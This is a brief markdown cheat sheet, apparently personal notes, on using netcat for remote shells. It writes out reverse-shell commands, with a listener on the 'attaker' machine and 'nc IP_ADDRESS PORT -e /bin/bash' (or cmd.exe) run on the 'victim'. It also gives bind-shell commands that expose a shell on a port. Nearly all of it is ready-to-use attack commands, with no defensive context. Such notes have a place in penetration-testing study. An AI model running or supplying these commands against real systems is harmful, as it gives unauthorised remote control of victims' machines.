# How to use?
- nc IP_ADDRESS PORT
	- ie. nc 192.168.86.147 13337

# Reverse Shell
- nc -nvlp PORT >> this goes in your machine (attaker)
- nc IP_ADDRESS PORT -e /bin/bash >> this goes in the other computer (victim)
	- cmd.exe or c:\Windows\system32\cmd.exe

# Bind shell
- nc -nvlp PORT -e /bin/bash >> this goes in the other computer (victim)
- nc IP_ADDRESS PORT

